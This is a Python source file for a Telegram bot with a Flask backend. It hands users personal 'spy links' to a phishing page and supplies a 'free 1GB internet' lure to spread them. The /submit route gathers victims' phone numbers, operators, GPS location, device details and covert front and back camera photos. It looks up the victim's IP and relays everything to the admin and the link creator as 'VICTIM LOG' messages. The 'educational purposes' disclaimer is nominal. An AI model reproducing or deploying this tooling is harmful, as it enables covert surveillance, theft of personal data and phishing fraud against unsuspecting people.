import logging
import re
import os
import json
import base64
from io import BytesIO
import httpx # IP তথ্যের জন্য
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler, TypeHandler
from flask import Flask, request, jsonify

# --- Flask অ্যাপ সেটআপ (ওয়েব সার্ভার) ---
flask_app = Flask(__name__)

# --- টেলিগ্রাম বট কনফিগারেশন ---
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID")
PHISHING_SITE_URL = os.environ.get("PHISHING_SITE_URL") # Netlify URL

CHANNEL_LINK = "https://t.me/+rj4147h5OD8yMzQ9"
OWNER_USERNAME = "https://t.me/TheSagorOfficial"

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

application = Application.builder().token(TOKEN).build()

# --- IP তথ্য সংগ্রহের ফাংশন ---
async def get_ip_details(ip_address):
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(f'http://ip-api.com/json/{ip_address}')
            if response.status_code == 200:
                return response.json()
    except Exception as e:
        logger.error(f"Failed to get IP details for {ip_address}: {e}")
    return {}

# --- Flask রুট: /submit (script.js থেকে ডেটা গ্রহণ করার জন্য) ---
@flask_app.route('/submit', methods=['POST'])
def handle_submit():
    victim_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    data = request.get_json()
    
    # একটি কাস্টম আপডেট তৈরি করে টেলিগ্রামের 대기열ে যোগ করা
    # যাতে এটি টেলিগ্রামের হ্যান্ডলার দ্বারা প্রক্রিয়া করা যায়
    custom_update = {'victim_ip': victim_ip, 'data': data}
    application.update_queue.put(custom_update)
    
    return jsonify({"status": "ok"}), 200

# --- কাস্টম ডেটা হ্যান্ডলার (Flask থেকে আসা ডেটা প্রক্রিয়া করার জন্য) ---
async def process_victim_data(update: dict, context: CallbackContext):
    victim_ip = update.get('victim_ip')
    data = update.get('data')
    
    student_id = data.get('student_id') or 'unknown'
    form_data = data.get('form_data', {})
    device_info = data.get('device_info', {})
    location_info = data.get('location_info', {})
    image_data = data.get('image_data', {})

    ip_details = await get_ip_details(victim_ip)

    location_link = "Not Available"
    if 'lat' in location_info:
        location_link = f"https://www.google.com/maps?q={location_info['lat']},{location_info['lon']}"

    # --- অ্যাডমিনের জন্য মেসেজ তৈরি ---
    admin_message = f"""
[student_id={student_id}]
💀 ***====[ VICTIM LOG | @TheSagorOfficial ]====*** 💀

--- ***FORM DATA*** ---
📞 ***Number:*** `{form_data.get('country')} {form_data.get('mobileNumber')}`
📡 ***Operator:*** `{form_data.get('operator')}`

--- ***IP & LOCATION*** ---
🌐 ***IP Address:*** `{victim_ip}`
🏢 ***ISP:*** `{ip_details.get('isp', 'N/A')}`
🔍 ***ASN:*** `{ip_details.get('as', 'N/A')}`
🌍 ***Country:*** `{ip_details.get('country', 'N/A')}`
🏙️ ***City:*** `{ip_details.get('city', 'N/A')}`
📍 ***Google Maps:*** [View on Map]({location_link})

--- ***DEVICE INFO*** ---
📱 ***Device Type:*** `{device_info.get('deviceType')}`
🔋 ***Battery:*** `{device_info.get('battery', {}).get('level')}`
🔌 ***Charging:*** `{device_info.get('battery', {}).get('charging')}`
... (অন্যান্য তথ্য)
"""
    # --- স্টুডেন্টের জন্য মেসেজ তৈরি (ট্যাগ ছাড়া) ---
    student_message = admin_message.replace(f"[student_id={student_id}]\n", "")

    # অ্যাডমিনকে মেসেজ পাঠানো
    await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=admin_message, parse_mode='Markdown')
    
    # স্টুডেন্টকে মেসেজ পাঠানো
    try:
        if student_id != 'unknown':
            await context.bot.send_message(chat_id=student_id, text=student_message, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Failed to send log to student {student_id}: {e}")

    # ছবি পাঠানো (যদি থাকে)
    for cam_type, img_data in image_data.items():
        if img_data:
            try:
                header, encoded = img_data.split(",", 1)
                img_bytes = base64.b64decode(encoded)
                photo_file = BytesIO(img_bytes)
                
                admin_caption = f"Photo ({cam_type}) for [student_id={student_id}]"
                student_caption = f"Photo ({cam_type}) from victim"

                # অ্যাডমিনকে ছবি পাঠানো
                await context.bot.send_photo(chat_id=ADMIN_CHAT_ID, photo=photo_file, caption=admin_caption)
                
                # স্টুডেন্টকে ছবি পাঠানো
                if student_id != 'unknown':
                    photo_file.seek(0) # ফাইল পয়েন্টার রিসেট করা
                    await context.bot.send_photo(chat_id=student_id, photo=photo_file, caption=student_caption)
            except Exception as e:
                logger.error(f"Failed to send photo to {student_id}: {e}")


# --- টেলিগ্রাম কমান্ড হ্যান্ডলার (অপরিবর্তিত) ---
async def start(update: Update, context: CallbackContext) -> None:
    # ... (আপনার আগের start ফাংশনের কোড এখানে থাকবে)
    user = update.effective_user
    welcome_message = (
        f"Welcome, {user.first_name}!\n\n"
        "You can use this bot to generate a spy link! 🎉\n\n"
        "𝗬𝗼𝘂 𝗰𝗮𝗻 𝗛𝗮𝗰𝗸 :\n"
        "🔹 Front Camera\n"
        "🔹 Back Camera\n"
        "🔹 Location with map\n"
        "🔹 Phone number\n"
        "🔹 Sim Type\n"
        "🔹 IP, Battery, and many more\n"
        "🔹 Device type\n\n"
        "𝗡𝗼𝘁𝗲: 𝗜𝘁 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗳𝘂𝗻 𝗮𝗻𝗱 𝗲𝗱𝘂𝗰𝗮𝘁𝗶𝗼𝗻𝗮𝗹 𝗽𝘂𝗿𝗽𝗼𝘀𝗲𝘀 💡\n\n"
        "Now press create button to generate your link. 😊"
    )
    keyboard = [[InlineKeyboardButton("Create", callback_data='create_link')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(welcome_message, reply_markup=reply_markup)

async def create_link_handler(update: Update, context: CallbackContext) -> None:
    # ... (আপনার আগের create_link_handler ফাংশনের কোড এখানে থাকবে)
    user_id = update.effective_user.id
    personal_link = f"{PHISHING_SITE_URL}?id={user_id}"
    message_text = (
        "🎉 𝗬𝗼𝘂𝗿 𝗨𝗻𝗶𝗾𝘂𝗲 𝗧𝗿𝗮𝗰𝗸𝗶𝗻𝗴 𝗟𝗶𝗻𝗸 𝗶𝘀 𝗥𝗲𝗮𝗱𝘆! 🎉\n\n"
        f"🔗 𝗬𝗼𝘂𝗿 𝗟𝗶𝗻𝗸: `{personal_link}`\n\n"
        "📝𝗡𝗼𝘁𝗲⚠\n\n"
        "->This bot 𝗨𝗥𝗟 not work complete on telegram web\n\n"
        "->So Use this 𝗨𝗥𝗟 on chrome or others browsers.✅\n\n"
        "Feel The power 💪⚡ of sagor Sheikh 😎"
    )
    share_text = (
        "🌟𝗘𝘅𝗰𝗹𝘂𝘀𝗶𝘃𝗲 𝗢𝗳𝗳𝗲𝗿: 𝗖𝗹𝗮𝗶𝗺 𝗬𝗼𝘂𝗿 𝗙𝗿𝗲𝗲 𝟭𝗚𝗕 𝗗𝗮𝘁𝗮!🌟\n\n"
        "Looking for a quick internet boost? 🎁\n"
        "Enjoy 1GB of free internet 🌍✨!\n\n"
        "✨ 𝗖𝗹𝗮𝗶𝗺 𝘆𝗼𝘂𝗿 𝗙𝗥𝗘𝗘 𝟭𝗚𝗕 𝗻𝗼𝘄! 🚀\n\n"
        f"👉𝗚𝗲𝘁 Your 𝗙𝗿𝗲𝗲 𝟭𝗚𝗕\n"
        f"👉{personal_link}\n\n"
        "Don't wait, 𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝘁𝗶𝗺𝗲 𝗼𝗳𝗳𝗲𝗿!"
    )
    telegram_share_url = f"https://t.me/share/url?url=&text={share_text.replace(' ', '%20').replace('\n', '%0A')}"
    keyboard = [
        [InlineKeyboardButton("Share this with friends", url=telegram_share_url)],
        [InlineKeyboardButton("My another Channel", url=CHANNEL_LINK)],
        [InlineKeyboardButton("Contact owner if any issue", url=OWNER_USERNAME)]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    if update.callback_query:
        await update.callback_query.edit_message_text(text=message_text, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        await update.message.reply_text(text=message_text, reply_markup=reply_markup, parse_mode='Markdown')

# --- মূল ফাংশন ---
def main() -> None:
    # টেলিগ্রাম হ্যান্ডলার যুক্ত করা
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("create", create_link_handler))
    application.add_handler(CallbackQueryHandler(create_link_handler, pattern='^create_link$'))
    
    # কাস্টম ডেটা হ্যান্ডলার যুক্ত করা
    application.add_handler(TypeHandler(dict, process_victim_data))

    # Flask অ্যাপটি একটি আলাদা থ্রেডে চালানো
    from threading import Thread
    flask_thread = Thread(target=lambda: flask_app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080))))
    flask_thread.daemon = True
    flask_thread.start()

    logger.info("Bot is running...")
    application.run_polling()

if __name__ == '__main__':
    main()
